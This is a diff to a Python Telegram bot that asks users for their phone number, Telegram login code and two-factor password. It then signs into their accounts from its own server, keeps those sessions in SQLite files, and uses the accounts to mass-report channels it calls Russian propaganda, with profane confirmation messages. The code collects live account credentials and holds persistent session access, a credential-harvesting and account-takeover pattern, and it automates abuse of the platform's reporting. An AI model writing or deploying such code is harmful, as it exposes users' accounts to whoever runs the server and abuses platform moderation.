@@ -2,12 +2,16 @@ import asyncio
 import os
 import re
 import sys
+import traceback
+from typing import Union, Optional, Tuple, Callable, Awaitable
 
 from aiogram.dispatcher import FSMContext
+from aiogram.dispatcher.filters import Text
 from aiogram.types import ContentType, ParseMode, Message
+from aiogram.utils import executor
 from telethon import TelegramClient
 from phonenumbers.phonenumberutil import country_code_for_region
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError
 from telethon.sessions import SQLiteSession
 from src.database.database import async_db_session
 from loader import dp, bot
@@ -21,11 +25,11 @@ API_ID = int(os.environ['API_ID'])
 API_HASH = os.environ['API_HASH']
 BOT_TOKEN = os.environ['BOT_TOKEN']
 
+user_code_fut = dict()
 user_password_fut = dict()
 
 code_pattern = r"(code|код)(?P<code>\d+)"
 code_regex = re.compile(code_pattern)
-restart_command_pattern = rf"({kb.msg_restart_ru}|{kb.msg_restart_ua}|{kb.msg_restart_en})"
 
 
 class BotException(Exception):
@@ -57,6 +61,34 @@ async def is_start_command(msg):
     return msg.is_command() or msg.text in [kb.msg_restart_ru, kb.msg_restart_ua, kb.msg_restart_en]
 
 
+async def hello_help(msg):
+    locale = msg.from_user.locale
+    if locale.language == 'ru':
+        await msg.answer(
+            f"Привет, {msg.from_user.get_mention(as_html=True)} 👋!\n"
+            f"Этот чат позволяет заблокировать телеграмм каналы которые распространяют ложную информацию об Украине, "
+            f"а также платят террористам за терракты в Украине !\n",
+            parse_mode=ParseMode.HTML,
+            reply_markup=kb.menu_ru
+        )
+    elif locale.language == 'ua':
+        await msg.answer(
+            f"Привіт, {msg.from_user.get_mention(as_html=True)} 👋!\n"
+            f"Цей чат дозволяє заблокувати телеграмм канали котрі розповсюджують хибну інформацію про Україну, "
+            f"а також платят терористам за теракти в Україні !\n",
+            parse_mode=ParseMode.HTML,
+            reply_markup=kb.menu_ua
+        )
+    else:
+        await msg.answer(
+            f"Hello, {msg.from_user.get_mention(as_html=True)} 👋!\n"
+            f"This chat bot allows to block the telegram channels that spread misinformation about Ukraine "
+            f"and pay terrorists for tract on Ukraine !\n",
+            parse_mode=ParseMode.HTML,
+            reply_markup=kb.menu_en
+        )
+
+
 async def press_button_start_again(msg):
     locale = msg.from_user.locale
     user_id = msg.from_user.id
@@ -68,14 +100,26 @@ async def press_button_start_again(msg):
         await bot.send_message(user_id, f"Timeout, press command 'Start again️'")
 
 
-async def enter_phone_first(msg):
+async def enter_phone(msg):
     locale = msg.from_user.locale
     if locale.language == 'ru':
-        await bot.send_message(msg.from_user.id, f"Введите телефон первым !!")
+        await msg.reply(
+            f"Введите свой номер телефона\n",
+            parse_mode=ParseMode.HTML,
+            reply_markup=kb.menu_ru
+        )
     elif locale.language == 'ua':
-        await bot.send_message(msg.from_user.id, f"Введіть телефон першим !!")
+        await msg.reply(
+            f"Введіть свій номер телефона\n",
+            parse_mode=ParseMode.HTML,
+            reply_markup=kb.menu_ua
+        )
     else:
-        await bot.send_message(msg.from_user.id, f"Enter phone first !!")
+        await msg.reply(
+            f"Enter your phone number\n",
+            parse_mode=ParseMode.HTML,
+            reply_markup=kb.menu_en
+        )
 
 
 async def enter_phone_error_empty(msg):
@@ -168,6 +212,18 @@ async def confirmation_password_error(msg):
         await bot.send_message(msg.from_user.id, f"Password confirmation shouldn't be empty !!")
 
 
+async def fuck_russia_channels(msg):
+    locale = msg.from_user.locale
+    user_id = msg.from_user.id
+    if locale.language == 'ru':
+        await bot.send_message(user_id, f"Вы залогинены, сейчас вы выебете рашисткие телеграм каналы !! Благодарю за сотрудничество !!")
+    elif locale.language == 'ua':
+        await bot.send_message(user_id, f"Ви залогінені, зараз ви виебет рашисткі телеграм канали !! Дякую за співпрацю !!")
+    else:
+        await bot.send_message(user_id, f"You are logged in, now you will fuck russian telegram channels !! Thank you for your cooperation !!")
+
+
+
 async def phone_validate_and_update(msg, phone):
     locale = msg.from_user.locale
     if len(phone) == 0:
@@ -193,34 +249,194 @@ async def phone_validate_and_update(msg, phone):
             return phone
 
 
-@dp.message_handler(commands=['start'])
-async def process_start_command(msg: Message):
+async def connect_using_phone(msg, state, phone):
+    username = msg.from_user.mention
+    client = TelegramClient(SQLiteSession(username), API_ID, API_HASH)
+    try:
+        await client.connect()
+        if client.is_connected():
+            if not await client.is_user_authorized():
+                await User.Code.set()
+                response = await client.send_code_request(phone)
+                await enter_code_confirmation(msg)
+                loop = asyncio.get_running_loop()
+                code_fut = loop.create_future()
+                user_code_fut[username] = code_fut
+                code = await code_fut
+                await client.sign_in(phone=phone, code=code, phone_code_hash=response.phone_code_hash)
+            if await client.is_user_authorized():
+                await User.Done.set()
+                await fuck_russia_channels(msg)
+                await report_channels(client, create_report_channels_callback(msg))
+    except SessionPasswordNeededError as ex:
+        print(f"ERROR: {ex}", file=sys.stderr)
+        await User.Password.set()
+        await enter_password_confirmation(msg)
+
+        loop = asyncio.get_running_loop()
+        password_fut = loop.create_future()
+        user_password_fut[username] = password_fut
+        password = await password_fut
+        response = await client.sign_in(password=password)
+        if await client.is_user_authorized():
+            user = response
+            await User.Done.set()
+            await fuck_russia_channels(msg)
+            await report_channels(client, create_report_channels_callback(msg))
+    except Exception as ex:
+        print(f"ERROR: {ex}", file=sys.stderr)
+        traceback.print_stack(file=sys.stderr)
+        traceback.print_exc(file=sys.stderr)
+        user_id = msg.from_user.id
+        await bot.send_message(user_id, f"ERROR: {ex}")
+    finally:
+        if client.is_connected():
+            await client.disconnect()
+
+
+async def send_code(msg, state, phone):
+    username = msg.from_user.mention
+    client = TelegramClient(SQLiteSession(username), API_ID, API_HASH)
+    try:
+        await client.connect()
+        if client.is_connected():
+            if not await client.is_user_authorized():
+                await User.Code.set()
+                response = await client.send_code_request(phone)
+                await enter_code_confirmation(msg)
+                async with state.proxy() as data:
+                    data['phone_code_hash'] = response.phone_code_hash
+                    print(f"phone = {phone}, phone_code_hash = {response.phone_code_hash}")
+            else:
+                await fuck_russia_channels(msg)
+                await report_channels(client, create_report_channels_callback(msg))
+    except Exception as ex:
+        print(f"ERROR: {ex}", file=sys.stderr)
+        traceback.print_stack(file=sys.stderr)
+        traceback.print_exc(file=sys.stderr)
+        user_id = msg.from_user.id
+        await bot.send_message(user_id, f"ERROR: {ex}")
+    finally:
+        if client.is_connected():
+            await client.disconnect()
+
+
+async def connect_using_code(msg, phone, code, phone_code_hash):
+    username = msg.from_user.mention
+    client = TelegramClient(SQLiteSession(username), API_ID, API_HASH)
+    try:
+        await client.connect()
+        if client.is_connected():
+            if not await client.is_user_authorized():
+                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+                await User.Done.set()
+                await fuck_russia_channels(msg)
+                await report_channels(client, create_report_channels_callback(msg))
+    except SessionPasswordNeededError as ex:
+        print(f"ERROR: {ex}", file=sys.stderr)
+        await User.Password.set()
+        await enter_password_confirmation(msg)
+
+        loop = asyncio.get_running_loop()
+        password_fut = loop.create_future()
+        user_password_fut[username] = password_fut
+        password = await password_fut
+        response = await client.sign_in(password=password)
+        if await client.is_user_authorized():
+            user = response
+            await User.Done.set()
+            await fuck_russia_channels(msg)
+            await report_channels(client, create_report_channels_callback(msg))
+    except Exception as ex:
+        print(f"ERROR: {ex}", file=sys.stderr)
+        traceback.print_stack(file=sys.stderr)
+        traceback.print_exc(file=sys.stderr)
+        user_id = msg.from_user.id
+        await bot.send_message(user_id, f"ERROR: {ex}")
+    finally:
+        if client.is_connected():
+            await client.disconnect()
+
+
+async def connect_using_password(msg, state, phone, password):
+    username = msg.from_user.mention
+    client = TelegramClient(SQLiteSession(username), API_ID, API_HASH)
+    try:
+        await client.connect()
+        if client.is_connected():
+            if not await client.is_user_authorized():
+                response = await client.sign_in(password=password)
+                if await client.is_user_authorized():
+                    user = response
+                    await User.Done.set()
+                    await fuck_russia_channels(msg)
+                    await report_channels(client, create_report_channels_callback(msg))
+    except Exception as ex:
+        print(f"ERROR: {ex}", file=sys.stderr)
+        traceback.print_stack(file=sys.stderr)
+        traceback.print_exc(file=sys.stderr)
+        user_id = msg.from_user.id
+        await bot.send_message(user_id, f"ERROR: {ex}")
+    finally:
+        if client.is_connected():
+            await client.disconnect()
+
+
+def create_report_channels_callback(msg) -> Callable[[Union[Optional[str], Tuple[str, Exception]]], Awaitable[None]]:
     locale = msg.from_user.locale
+    user_id = msg.from_user.id
+
+    async def report_channels_callback(arg: Union[Optional[str], Tuple[str, Exception]]):
+        if type(arg) == str:
+            ch_name = arg
+            if locale.language == 'ru':
+                await bot.send_message(user_id, f"Успешно отправлен репорт про {ch_name}")
+            elif locale.language == 'ua':
+                await bot.send_message(user_id, f"Успішно відправлено репорт про {ch_name}")
+            else:
+                await bot.send_message(user_id, f"Successfully reported about {ch_name}")
+        elif type(arg) == tuple:
+            ch_name, ex = arg
+            if locale.language == 'ru':
+                await bot.send_message(user_id, f"ОШИБКА: Репорт про канал {ch_name}:\n{ex}")
+            elif locale.language == 'ua':
+                await bot.send_message(user_id, f"ПОМИЛКА: Репорт про канал {ch_name}:\n{ex}")
+            else:
+                await bot.send_message(user_id, f"ERROR: Report about {ch_name}:\n{ex}")
+        elif arg is None:
+            if locale.language == 'ru':
+                await bot.send_message(user_id, "Репорты на все каналы отправлены успешно !!")
+            elif locale.language == 'ua':
+                await bot.send_message(user_id, "Репорти на всі канали відправлені успішно !!")
+            else:
+                await bot.send_message(user_id, "All channels reported successfully !!")
+
+    return report_channels_callback
+
+
+@dp.message_handler(commands='start',
+                    state='*')
+async def process_start_command(msg: Message):
     await User.Phone.set()
-    if locale.language == 'ru':
-        await msg.answer(
-            f"Привет, {msg.from_user.get_mention(as_html=True)} 👋!\n"
-            f"Этот чат позволяет заблокировать телеграмм каналы которые распространяют ложную информацию об Украине, "
-            f"а также платят террористам за терракты в Украине !\n",
-            parse_mode=ParseMode.HTML,
-            reply_markup=kb.menu_ru
-        )
-    elif locale.language == 'ua':
-        await msg.answer(
-            f"Привіт, {msg.from_user.get_mention(as_html=True)} 👋!\n"
-            f"Цей чат дозволяє заблокувати телеграмм канали котрі розповсюджують хибну інформацію про Україну, "
-            f"а також платят терористам за теракти в Україні !\n",
-            parse_mode=ParseMode.HTML,
-            reply_markup=kb.menu_ua
-        )
-    else:
-        await msg.answer(
-            f"Hello, {msg.from_user.get_mention(as_html=True)} 👋!\n"
-            f"This chat bot allows to block the telegram channels that spread misinformation about Ukraine "
-            f"and pay terrorists for tract on Ukraine !\n",
-            parse_mode=ParseMode.HTML,
-            reply_markup=kb.menu_en
-        )
+    await hello_help(msg)
+    await enter_phone(msg)
+
+
+@dp.message_handler(Text(equals=[kb.msg_restart_ru, kb.msg_restart_ua, kb.msg_restart_en], ignore_case=True),
+                    state='*')
+async def process_text_command(msg: Message, state: FSMContext):
+    username = msg.from_user.mention
+    if await is_start_command(msg):
+        if username in user_code_fut:
+            code_fut = user_code_fut[username]
+            code_fut.cancel()
+
+        if username in user_password_fut:
+            password_fut = user_password_fut[username]
+            password_fut.cancel()
+
+        await User.Phone.set()
+        await enter_phone(msg)
 
 
 @dp.message_handler(state=User.Phone, content_types=ContentType.CONTACT)
@@ -235,9 +451,10 @@ async def process_phone(msg: Message, state: FSMContext):
         async with state.proxy() as data:
             data['phone'] = phone
 
-        await User.Code.set()
-
-        await send_code(msg, state, phone)
+        # TODO: send_code do not work because using it creates separate client for sending code
+        # See also the issue https://github.com/LonamiWebs/Telethon/issues/278 and other multiple errors
+        # asyncio.create_task(send_code(msg, state, phone))
+        asyncio.create_task(connect_using_phone(msg, state, phone))
 
 
 @dp.message_handler(state=User.Phone, content_types=ContentType.TEXT)
@@ -252,30 +469,10 @@ async def process_phone_text(msg: Message, state: FSMContext):
         async with state.proxy() as data:
             data['phone'] = phone
 
-        await send_code(msg, state, phone)
-
-
-async def send_code(msg, state, phone):
-    username = msg.from_user.username
-    client = TelegramClient(SQLiteSession(username), API_ID, API_HASH)
-    try:
-        await client.connect()
-        if client.is_connected():
-            if not await client.is_user_authorized():
-                await User.Code.set()
-                response = await client.send_code_request(phone)
-                await enter_code_confirmation(msg)
-                async with state.proxy() as data:
-                    data['phone_code_hash'] = response.phone_code_hash
-            else:
-                await report_channels(client)
-    except Exception as ex:
-        print(f"ERROR: {ex}", file=sys.stderr)
-        user_id = msg.from_user.id
-        await bot.send_message(user_id, f"ERROR: {ex}")
-    finally:
-        if client.is_connected():
-            await client.disconnect()
+        # TODO: send_code do not work because using it creates separate client for sending code
+        # See also the issue https://github.com/LonamiWebs/Telethon/issues/278 and other multiple errors
+        # asyncio.create_task(send_code(msg, state, phone))
+        asyncio.create_task(connect_using_phone(msg, state, phone))
 
 
 @dp.message_handler(state=User.Code)
@@ -287,59 +484,29 @@ async def process_code(msg: Message, state: FSMContext):
         else:
             code = code_match.group('code')
             print(f"Received code = {code}")
-            phone = None
-            phone_code_hash = None
-            async with state.proxy() as data:
-                data['code'] = code
-                phone = data['phone']
-                phone_code_hash = data['phone_code_hash']
+            username = msg.from_user.mention
+            if username in user_code_fut:
+                code_fut = user_code_fut[username]
+                code_fut.set_result(code)
+            else:
+                async with state.proxy() as data:
+                    data['code'] = code
+                    phone = data['phone']
+                    phone_code_hash = data['phone_code_hash']
+                    print(f"phone = {phone}, phone_code_hash = {phone_code_hash}")
 
-                asyncio.create_task(connect_using_code(msg, phone, code, phone_code_hash))
-
-
-async def connect_using_code(msg, phone, code, phone_code_hash):
-    username = msg.from_user.username
-    client = TelegramClient(SQLiteSession(username), API_ID, API_HASH)
-    try:
-        await client.connect()
-        if client.is_connected():
-            if not await client.is_user_authorized():
-                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-                await User.Done.set()
-                await report_channels(client)
-    except SessionPasswordNeededError as ex:
-        print(f"ERROR: {ex}", file=sys.stderr)
-        await User.Password.set()
-        await enter_password_confirmation(msg)
-
-        loop = asyncio.get_running_loop()
-        password_fut = loop.create_future()
-        user_password_fut[username] = password_fut
-        password = await password_fut
-        response = await client.sign_in(password=password)
-        if await client.is_user_authorized():
-            user = response
-            await User.Done.set()
-            await report_channels(client)
-
-    except Exception as ex:
-        print(f"ERROR: {ex}", file=sys.stderr)
-        user_id = msg.from_user.id
-        await bot.send_message(user_id, f"ERROR: {ex}")
-    finally:
-        if client.is_connected():
-            await client.disconnect()
+                    asyncio.create_task(connect_using_code(msg, phone, code, phone_code_hash))
 
 
 @dp.message_handler(state=User.Password)
 async def process_password(msg: Message, state: FSMContext):
     if not await is_start_command(msg):
         password = msg.text
-        print(f"Received password = {password}")
+        print(f"Received password")
         if len(password) == 0:
             await confirmation_password_error(msg)
         else:
-            username = msg.from_user.username
+            username = msg.from_user.mention
             if username in user_password_fut:
                 password_fut = user_password_fut[username]
                 password_fut.set_result(password)
@@ -351,62 +518,10 @@ async def process_password(msg: Message, state: FSMContext):
                 await connect_using_password(msg, state, phone, password)
 
 
-async def connect_using_password(msg, state, phone, password):
-    username = msg.from_user.username
-    client = TelegramClient(SQLiteSession(username), API_ID, API_HASH)
-    try:
-        await client.connect()
-        if client.is_connected():
-            if not await client.is_user_authorized():
-                response = await client.sign_in(password=password)
-                if await client.is_user_authorized():
-                    user = response
-                    await User.Done.set()
-                    await report_channels(client)
-    except Exception as ex:
-        print(f"ERROR: {ex}", file=sys.stderr)
-        user_id = msg.from_user.id
-        await bot.send_message(user_id, f"ERROR: {ex}")
-    finally:
-        if client.is_connected():
-            await client.disconnect()
-
-
-@dp.message_handler(state=User.Done)
-@dp.message_handler(state='*', commands=['start'])
-@dp.message_handler(state='*', regexp=restart_command_pattern)
-async def process_text_command(msg: Message, state: FSMContext):
-    username = msg.from_user.username
-    locale = msg.from_user.locale
-    if await is_start_command(msg):
-        if username in user_password_fut:
-            password_fut = user_password_fut[username]
-            password_fut.cancel()
-
-        await User.Phone.set()
-        if locale.language == 'ru':
-            await msg.reply(
-                f"Введите свой номер телефона\n",
-                parse_mode=ParseMode.HTML,
-                reply_markup=kb.menu_ru
-            )
-        elif locale.language == 'ua':
-            await msg.reply(
-                f"Введіть свій номер телефона\n",
-                parse_mode=ParseMode.HTML,
-                reply_markup=kb.menu_ua
-            )
-        else:
-            await msg.reply(
-                f"Enter your phone number\n",
-                parse_mode=ParseMode.HTML,
-                reply_markup=kb.menu_en
-            )
-
-
 async def main():
     await async_db_session.init()
     await async_db_session.create_all()
+    await dp.skip_updates()
     await dp.start_polling()
 
 
